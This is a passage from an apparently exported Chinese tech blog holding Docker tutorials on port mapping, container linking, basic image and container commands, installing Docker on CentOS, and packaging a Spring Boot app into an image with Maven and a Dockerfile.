<h3 id="将容器指定端口随机映射到宿主机一个端口上。"><a href="#将容器指定端口随机映射到宿主机一个端口上。" class="headerlink" title="将容器指定端口随机映射到宿主机一个端口上。"></a>将容器指定端口随机映射到宿主机一个端口上。</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ~]<span class="comment"># docker run -P 80 -d --name nginx_1 nginx</span></span><br><span class="line">bed30930c9d7adf0755a8e1de65dd2d4a58b8af36c9f25f96f756efd1960586d</span><br></pre></td></tr></table></figure>
<p>nginx默认只会暴露一个80端口,其他命令内容一致。</p>
<h3 id="将容器指定端口指定映射到宿主机的一个端口上。"><a href="#将容器指定端口指定映射到宿主机的一个端口上。" class="headerlink" title="将容器指定端口指定映射到宿主机的一个端口上。"></a>将容器指定端口指定映射到宿主机的一个端口上。</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker zookeeper]<span class="comment"># docker run -p 80:80  -d --name nginx_1 nginx</span></span><br><span class="line">119434e3d56df73ee23a0223fb4430bfd08a06d7230263075e2a9a349261f938</span><br><span class="line"></span><br><span class="line">[root@docker zookeeper]<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                       PORTS                 NAMES</span><br><span class="line">119434e3d56d        nginx               <span class="string">"nginx -g 'daemon of…"</span>   8 seconds ago       Up 3 seconds                 0.0.0.0:80-&gt;80/tcp    nginx_1</span><br></pre></td></tr></table></figure>
<h3 id="将容器ip和端口，随机映射到宿主机上。"><a href="#将容器ip和端口，随机映射到宿主机上。" class="headerlink" title="将容器ip和端口，随机映射到宿主机上。"></a>将容器ip和端口，随机映射到宿主机上。</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker zookeeper]<span class="comment"># docker run -p 192.168.216.150::80  -d --name nginx_1 nginx</span></span><br><span class="line">0d813780941ebb324dcbd456ec746394d5d128f0545e3bb8b3870523df5d7e9f</span><br><span class="line">[root@docker zookeeper]<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                        PORTS                           NAMES</span><br><span class="line">0d813780941e        nginx               <span class="string">"nginx -g 'daemon of…"</span>   7 seconds ago       Up 5 seconds                  192.168.216.150:32768-&gt;80/tcp   nginx_1</span><br></pre></td></tr></table></figure>
<h3 id="将容器ip和端口，指定映射到宿主机上"><a href="#将容器ip和端口，指定映射到宿主机上" class="headerlink" title="将容器ip和端口，指定映射到宿主机上"></a>将容器ip和端口，指定映射到宿主机上</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker zookeeper]<span class="comment"># docker run -p 192.168.216.150:80:80  -d --name nginx_1 nginx</span></span><br><span class="line">0d813780941ebb324dcbd456ec746394d5d128f0545e3bb8b3870523df5d7e9f</span><br><span class="line">[root@docker zookeeper]<span class="comment"># docker ps -a</span></span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                        PORTS                           NAMES</span><br><span class="line">0d813780941e        nginx               <span class="string">"nginx -g 'daemon of…"</span>   7 seconds ago       Up 5 seconds                  192.168.216.150:80-&gt;80/tcp   nginx_1</span><br></pre></td></tr></table></figure>
<h1 id="容器互联"><a href="#容器互联" class="headerlink" title="容器互联"></a>容器互联</h1><p>在实际应用中往往需要多个容器交互，比如一个数据库容器来提供db服务，多个应用容器来部署应用，使用端口访问就会暴露端口，这样不太安全。有没有方法让容器互联呢？答案当然是有了。容器互联的方法有多种方式,link，但link是只针对单宿主主机的。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 建立nginx到mysql的映射关系</span></span><br><span class="line">[root@docker zookeeper]<span class="comment"># docker run -p 80:80 --name mysql_nginx --link mysqldb:mysqldb nginx</span></span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">## 进入容器</span></span><br><span class="line">[root@docker zookeeper]<span class="comment"># docker exec -it cc687823fc24 /bin/bash</span></span><br><span class="line"><span class="comment">## 查看环境</span></span><br><span class="line">root@cc687823fc24:/<span class="comment"># env</span></span><br><span class="line">MYSQLDB_PORT_3306_TCP_PORT=3306</span><br><span class="line">HOSTNAME=cc687823fc24</span><br><span class="line">NJS_VERSION=1.15.9.0.2.8-1~stretch</span><br><span class="line">MYSQLDB_ENV_MYSQL_VERSION=8.0.15-1debian9</span><br><span class="line">NGINX_VERSION=1.15.9-1~stretch</span><br><span class="line">MYSQLDB_PORT=tcp://172.17.0.2:3306</span><br><span class="line">MYSQLDB_ENV_MYSQL_MAJOR=8.0</span><br><span class="line">MYSQLDB_PORT_3306_TCP=tcp://172.17.0.2:3306</span><br><span class="line">PWD=/</span><br><span class="line">MYSQLDB_ENV_GOSU_VERSION=1.7</span><br><span class="line">HOME=/root</span><br><span class="line">MYSQLDB_NAME=/mysql_nginx/mysqldb</span><br><span class="line">TERM=xterm</span><br><span class="line">MYSQLDB_PORT_33060_TCP=tcp://172.17.0.2:33060</span><br><span class="line">MYSQLDB_PORT_3306_TCP_ADDR=172.17.0.2</span><br><span class="line">MYSQLDB_ENV_MYSQL_ROOT_PASSWORD=123456</span><br><span class="line">MYSQLDB_PORT_3306_TCP_PROTO=tcp</span><br><span class="line">MYSQLDB_PORT_33060_TCP_PROTO=tcp</span><br><span class="line">SHLVL=1</span><br><span class="line">MYSQLDB_PORT_33060_TCP_ADDR=172.17.0.2</span><br><span class="line">PATH=/usr/<span class="built_in">local</span>/sbin:/usr/<span class="built_in">local</span>/bin:/usr/sbin:/usr/bin:/sbin:/bin</span><br><span class="line">MYSQLDB_PORT_33060_TCP_PORT=33060</span><br><span class="line">_=/usr/bin/env</span><br></pre></td></tr></table></figure>
<p>telnet 查看端口是可以访问的</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@cc687823fc24:/<span class="comment"># telnet 172.17.0.2 3306</span></span><br><span class="line">Trying 172.17.0.2...</span><br><span class="line">Connected to 172.17.0.2.</span><br><span class="line">Escape character is <span class="string">'^]'</span>.</span><br></pre></td></tr></table></figure>
<p>至此，单机的容器互联技术已经OK,集群之间互联下次再说。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li><a href="https://hub.docker.com/_/mysql/" target="_blank" rel="noopener">docker mysql环境配置项</a></li>
<li><a href="https://docs.docker.com/network/links/" target="_blank" rel="noopener">Legacy container links</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>devops</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker基础</title>
    <url>/2018/08/28/devops/docker%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<p>Docker 是一个开源的应用容器引擎，基于 Go 语言 并遵从Apache2.0协议开源。</p>
<p>Docker 可以让开发者打包他们的应用以及依赖包到一个轻量级、可移植的容器中，然后发布到任何流行的 Linux 机器上，也可以实现虚拟化。<br>容器是完全使用沙箱机制，相互之间不会有任何接口（类似 iPhone 的 app）,更重要的是容器性能开销极低。<br>此文以安装nginx为例，简单了解docker的使用。<br><a id="more"></a></p>
<h1 id="Docker核心概念"><a href="#Docker核心概念" class="headerlink" title="Docker核心概念"></a>Docker核心概念</h1><h2 id="镜像-image"><a href="#镜像-image" class="headerlink" title="镜像(image)"></a>镜像(image)</h2><p>Docker镜像是由文件系统叠加而成。最底端是一个文件引导系统，即bootfs。Docker用户不会与引导文件系统有直接的交互。Docker镜像的第二层是root文件系统rootfs，通常是一种或多种操作系统，例如ubuntu等。在Docker中，文件系统永远都是只读的，在每次修改时，都是进行拷贝叠加从而形成最终的文件系统。Docker称这样的文件为镜像。一个镜像可以迭代在另一个镜像的顶部。位于下方的镜像称之为父镜像，最底层的镜像称之为基础镜像。最后，当从一个镜像启动容器时，Docker会在最顶层加载一个读写文件系统作为容器。</p>
<h2 id="容器-container"><a href="#容器-container" class="headerlink" title="容器(container)"></a>容器(container)</h2><p>镜像是静态的，镜像的每一层都只是可读的，而容器是动态的里面运行着我们指定的应用，容器里面的应用可能会新建一个文件，修改一个目录，这些操作所带来的改变并不会作用到镜像里面，因为镜像只是可读的。所以通过镜像创建容器就是在镜像上加一个可读写的层。</p>
<h2 id="仓库-repository"><a href="#仓库-repository" class="headerlink" title="仓库(repository)"></a>仓库(repository)</h2><p>仓库和maven中jar仓库一样,是几种存放管理镜像的地方.</p>
<h1 id="安装Docker"><a href="#安装Docker" class="headerlink" title="安装Docker"></a>安装Docker</h1><p>centos 6.9安装docker<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 查看系统版本</span></span><br><span class="line">uname -a</span><br><span class="line"></span><br><span class="line">Linux docker 2.6.32-696.el6.x86_64 <span class="comment">#1 SMP Tue Mar 21 19:29:05 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#安装EPEL,因为系统自带的repo中不带docker需要安装epel</span></span><br><span class="line"></span><br><span class="line">rpm -Uvh http://ftp.riken.jp/Linux/fedora/epel/6Server/x86_64/epel-release-6-8.noarch.rpm</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载老版本docker</span></span><br><span class="line">sudo yum remove docker \</span><br><span class="line">                  docker-client \</span><br><span class="line">                  docker-client-latest \</span><br><span class="line">                  docker-common \</span><br><span class="line">                  docker-latest \</span><br><span class="line">                  docker-latest-logrotate \</span><br><span class="line">                  docker-logrotate \</span><br><span class="line">                  docker-selinux \</span><br><span class="line">                  docker-engine-selinux \</span><br><span class="line">                  docker-engine</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装docker</span></span><br><span class="line">yum install -y docker-io</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动docker</span></span><br><span class="line">sudo service docker start</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看docker运行状态</span></span><br><span class="line">sudo service docker status</span><br></pre></td></tr></table></figure></p>
<h1 id="安装镜像"><a href="#安装镜像" class="headerlink" title="安装镜像"></a>安装镜像</h1><h2 id="搜索镜像"><a href="#搜索镜像" class="headerlink" title="搜索镜像"></a>搜索镜像</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker search nginx</span><br></pre></td></tr></table></figure>
<p><img src="/2018/08/28/devops/docker基础/docker_search.png" alt></p>
<p>其中各字段信息为:</p>
<blockquote>
<ul>
<li>NAME:镜像仓库源的名称</li>
<li>DESCRIPTION:镜像的描述</li>
<li>STARS:表示评分</li>
<li>OFFICIAL:是否docker官方发布</li>
<li>AUTOMATED:是否自动创建。该类资源允许用户验证资源的来源和内容。</li>
</ul>
</blockquote>
<h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><p>可以使用docker pull NAME[:TAG]命令从网络上下载镜像。如果不显式指定TAG,默认会选择latest标签,即下载最新版本的镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull nginx</span><br></pre></td></tr></table></figure>
<h2 id="查看镜像的详细信息"><a href="#查看镜像的详细信息" class="headerlink" title="查看镜像的详细信息"></a>查看镜像的详细信息</h2><p>用命令docker images 查看所有安装的镜像信息,用 inspect IMAGE ID 查看详细信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@bogon ~]<span class="comment"># docker images</span></span><br><span class="line"></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">consul              latest              21c1d4ed11da        2 weeks ago         105MB</span><br><span class="line">erlang              latest              fd257b036a25        4 weeks ago         1.06GB</span><br><span class="line">rabbitmq            management          d69a5113ceae        2 months ago        149MB</span><br><span class="line">rabbitmq            latest              e8261c2af9fe        2 months ago        125MB</span><br></pre></td></tr></table></figure>
<p>其中各项信息含义为：</p>
<blockquote>
<ul>
<li>REPOSITORY,镜像的来源仓库信息</li>
<li>TAG,镜像的标签信息</li>
<li>IMAGE ID,镜像的ID</li>
<li>CREATED,创建时间</li>
<li>SIZE,镜像大小</li>
</ul>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ~]<span class="comment"># docker inspect 7b2ec12a5042</span></span><br></pre></td></tr></table></figure>
<p>详细信息如下<br><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">[</span><br><span class="line">&#123;</span><br><span class="line">    <span class="attr">"Id"</span>: <span class="string">"7b2ec12a50420a859b2731071494750a1040b4e9c76a43ea5cf9179712df5f2a"</span>,</span><br><span class="line">    <span class="attr">"Parent"</span>: <span class="string">"1ae58a018d101a53ff771cb30a37e01fe1e0f3ff34abe335178673d8c2135bda"</span>,</span><br><span class="line">    <span class="attr">"Comment"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"Created"</span>: <span class="string">"2018-07-24T17:21:51.548456912Z"</span>,</span><br><span class="line">    <span class="attr">"Container"</span>: <span class="string">"895e85f09f69727097e9c1783362736d7ee9b5b32f9eae1e5e32f2e1002abf14"</span>,</span><br><span class="line">    <span class="attr">"ContainerConfig"</span>: &#123;</span><br><span class="line">        <span class="attr">"Hostname"</span>: <span class="string">"895e85f09f69"</span>,</span><br><span class="line">        <span class="attr">"Domainname"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"User"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"AttachStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"AttachStdout"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"AttachStderr"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"PortSpecs"</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">"ExposedPorts"</span>: &#123;</span><br><span class="line">            <span class="attr">"80/tcp"</span>: &#123;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"Tty"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"OpenStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"StdinOnce"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"Env"</span>: [</span><br><span class="line">            <span class="string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,</span><br><span class="line">            <span class="string">"NGINX_VERSION=1.15.2-1~stretch"</span>,</span><br><span class="line">            <span class="string">"NJS_VERSION=1.15.2.0.2.2-1~stretch"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"Cmd"</span>: [</span><br><span class="line">            <span class="string">"/bin/sh"</span>,</span><br><span class="line">            <span class="string">"-c"</span>,</span><br><span class="line">            <span class="string">"#(nop) "</span>,</span><br><span class="line">            <span class="string">"CMD [\"nginx\" \"-g\" \"daemon off;\"]"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"Image"</span>: <span class="string">"sha256:f1eea4ec6bee804c269e8443513d7afe26adb1615518ad56d014973fd5faa5f3"</span>,</span><br><span class="line">        <span class="attr">"Volumes"</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">"VolumeDriver"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"WorkingDir"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"Entrypoint"</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">"NetworkDisabled"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"MacAddress"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"OnBuild"</span>: [],</span><br><span class="line">        <span class="attr">"Labels"</span>: &#123;</span><br><span class="line">            <span class="attr">"maintainer"</span>: <span class="string">"NGINX Docker Maintainers \u003cdocker-maint@nginx.com\u003e"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"DockerVersion"</span>: <span class="string">"17.06.2-ce"</span>,</span><br><span class="line">    <span class="attr">"Author"</span>: <span class="string">""</span>,</span><br><span class="line">    <span class="attr">"Config"</span>: &#123;</span><br><span class="line">        <span class="attr">"Hostname"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"Domainname"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"User"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"AttachStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"AttachStdout"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"AttachStderr"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"PortSpecs"</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">"ExposedPorts"</span>: &#123;</span><br><span class="line">            <span class="attr">"80/tcp"</span>: &#123;&#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"Tty"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"OpenStdin"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"StdinOnce"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"Env"</span>: [</span><br><span class="line">            <span class="string">"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"</span>,</span><br><span class="line">            <span class="string">"NGINX_VERSION=1.15.2-1~stretch"</span>,</span><br><span class="line">            <span class="string">"NJS_VERSION=1.15.2.0.2.2-1~stretch"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"Cmd"</span>: [</span><br><span class="line">            <span class="string">"nginx"</span>,</span><br><span class="line">            <span class="string">"-g"</span>,</span><br><span class="line">            <span class="string">"daemon off;"</span></span><br><span class="line">        ],</span><br><span class="line">        <span class="attr">"Image"</span>: <span class="string">"sha256:f1eea4ec6bee804c269e8443513d7afe26adb1615518ad56d014973fd5faa5f3"</span>,</span><br><span class="line">        <span class="attr">"Volumes"</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">"VolumeDriver"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"WorkingDir"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"Entrypoint"</span>: <span class="literal">null</span>,</span><br><span class="line">        <span class="attr">"NetworkDisabled"</span>: <span class="literal">false</span>,</span><br><span class="line">        <span class="attr">"MacAddress"</span>: <span class="string">""</span>,</span><br><span class="line">        <span class="attr">"OnBuild"</span>: [],</span><br><span class="line">        <span class="attr">"Labels"</span>: &#123;</span><br><span class="line">            <span class="attr">"maintainer"</span>: <span class="string">"NGINX Docker Maintainers \u003cdocker-maint@nginx.com\u003e"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"Architecture"</span>: <span class="string">"amd64"</span>,</span><br><span class="line">    <span class="attr">"Os"</span>: <span class="string">"linux"</span>,</span><br><span class="line">    <span class="attr">"Size"</span>: <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"VirtualSize"</span>: <span class="number">108954999</span></span><br><span class="line">&#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
<h2 id="删除镜像"><a href="#删除镜像" class="headerlink" title="删除镜像"></a>删除镜像</h2><p>docker images 命令查看镜像id,docker rmi IMAGE ID来删除镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi 3535063d9957</span><br></pre></td></tr></table></figure>
<p><img src="/2018/08/28/devops/docker基础/docker_rmi.png" alt></p>
<p>提示被容器使用,不能被删除。可以添加参数-f来强制删除镜像，但是会有很多遗留问题，不建议。通常先删除容器再删除镜像。<br>查看正在运行的容器<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/08/28/devops/docker基础/docker_ps.png" alt></p>
<p>删除容器,用docker rm CONTAINER ID 命令来删除容器,删除成功后返回CONTAINER ID.</p>
<p><img src="/2018/08/28/devops/docker基础/docker_rm_id.png" alt></p>
<p>容器删除成功后，执行删除镜像命令,<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker rmi IMAGE ID</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/08/28/devops/docker基础/docker_rmi_image.png" alt></p>
<p>再次执行命令查看镜像信息,发现镜像已经被删除。</p>
<h1 id="启动nginx"><a href="#启动nginx" class="headerlink" title="启动nginx"></a>启动nginx</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -P nginx</span><br></pre></td></tr></table></figure>
<p><img src="/2018/08/28/devops/docker基础/docker_run_nginx.png" alt></p>
<ol>
<li>-d 指定后台启动</li>
<li>-P 当使用 -P 标记时，Docker 会随机映射一个 49000~49900 的端口到内部容器开放的网络端口。</li>
</ol>
<p>此时,docker会将应用的默认端口映射到主机的一个随机端口上。可以通过-p命令来指定docker端口和主机端口的映射关系。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run -d -p 80:80 --name nginx_web nginx</span><br></pre></td></tr></table></figure>
<ol>
<li>-p 指定容器和主机的端口</li>
<li>—name 指定容器的名称</li>
</ol>
<p><img src="/2018/08/28/devops/docker基础/docker_run_p.png" alt>   </p>
<h1 id="停止nginx"><a href="#停止nginx" class="headerlink" title="停止nginx"></a>停止nginx</h1><p>根据指定的名称或者id来停止服务</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker stop nginx_web</span><br></pre></td></tr></table></figure>
<h1 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h1><blockquote>
<ul>
<li>启动nginx失败防火墙失败</li>
</ul>
</blockquote>
<p><img src="/2018/08/28/devops/docker基础/docker_fail_iptables.png" alt>,<br>重新启动docker即可。</p>
<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
<ul>
<li>docker技术入门与实践</li>
<li><a href="https://www.docker.com/" target="_blank" rel="noopener">docker官网</a></li>
</ul>
</blockquote>
]]></content>
      <categories>
        <category>devops</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>docker部署spring boot项目</title>
    <url>/2019/03/06/devops/docker%E9%83%A8%E7%BD%B2spring%20boot%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<p>docker容器启动速度快，占用内存低，迁移方便。在云计算时代大放异彩。</p>
<h1 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h1><ol>
<li>docker安装完毕</li>
<li>JDK</li>
<li>maven配置ok</li>
<li>git(如果代码在远程仓库)</li>
</ol>
<h1 id="构建spring-boot项目"><a href="#构建spring-boot项目" class="headerlink" title="构建spring boot项目"></a>构建spring boot项目</h1><p>IDEA 创建一个简单的spring boot项目,此处主要关注maven和Dockerfile的配置</p>
<ol>
<li>pom.xml</li>
</ol>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--docker plugin--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.spotify<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>docker-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--镜像的名称--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">repository</span>&gt;</span>$&#123;docker.image.prefix&#125;/$&#123;project.artifactId&#125;<span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">imageName</span>&gt;</span>$&#123;project.artifactId&#125;<span class="tag">&lt;/<span class="name">imageName</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--Dockerfile所在目录--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">dockerDirectory</span>&gt;</span>.<span class="tag">&lt;/<span class="name">dockerDirectory</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">resource</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">targetPath</span>&gt;</span>/<span class="tag">&lt;/<span class="name">targetPath</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">directory</span>&gt;</span>$&#123;project.build.directory&#125;<span class="tag">&lt;/<span class="name">directory</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">include</span>&gt;</span>$&#123;project.build.finalName&#125;.jar<span class="tag">&lt;/<span class="name">include</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">resource</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure>
<ol>
<li>Dockerfile</li>
</ol>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">FROM</span> java:<span class="number">8</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">MAINTAINER</span> xwolf &lt;<span class="number">1232</span>@qq.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">9090</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MIN_HEAP <span class="number">512</span>m</span><br><span class="line"><span class="keyword">ENV</span> MAX_HEAP <span class="number">2048</span>m</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /opt/data/jars</span></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /opt/data/jars</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /opt/logs/ms</span></span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> /opt/logs/ms</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MODULE ms</span><br><span class="line"><span class="keyword">ENV</span> MODULE_VERSION <span class="number">0.0</span>.<span class="number">1</span>-SNAPSHOT</span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> ./<span class="variable">$&#123;MODULE&#125;</span>-<span class="variable">$&#123;MODULE_VERSION&#125;</span>.jar /opt/data</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> java -jar -Xms<span class="variable">$&#123;MIN_HEAP&#125;</span> -Xmx<span class="variable">$&#123;MAX_HEAP&#125;</span>  \</span></span><br><span class="line"><span class="bash">     <span class="variable">$&#123;MODULE&#125;</span>-<span class="variable">$&#123;MODULE_VERSION&#125;</span>.jar \</span></span><br><span class="line"><span class="bash">     &gt; /opt/logs/<span class="variable">$&#123;MODULE&#125;</span>-`date +%m%d%H%M`.<span class="built_in">log</span>  2&gt; /opt/logs/<span class="variable">$&#123;MODULE&#125;</span>-error-`date +%m%d%H%M`.<span class="built_in">log</span></span></span><br></pre></td></tr></table></figure>
<ol>
<li>简单的controller</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> xwolf</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 测试hello world</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="meta">@GetMapping</span>(<span class="string">"/hello"</span>)</span><br><span class="line">  <span class="function"><span class="keyword">public</span> String <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"Hello Docker"</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>保证项目可以正常启动即可(不能正常启动也可以^_^)。</p>
<h1 id="将代码拉下来"><a href="#将代码拉下来" class="headerlink" title="将代码拉下来"></a>将代码拉下来</h1><p>执行mvn命令,打包并创建镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@docker]<span class="comment"># mvn package docker:build</span></span><br></pre></td></tr></table></figure>
<p><img src="/2019/03/06/devops/docker部署spring boot项目/docker_20190306150809.png" alt></p>
<p>如果执行成功,查看docker镜像即可看到创建成功的镜像。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@docker ms]<span class="comment"># docker images</span></span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">xwolf/ms            latest              1f46538fb6e6        17 minutes ago      661MB</span><br></pre></td></tr></table></figure>
<p>运行docker image</p>
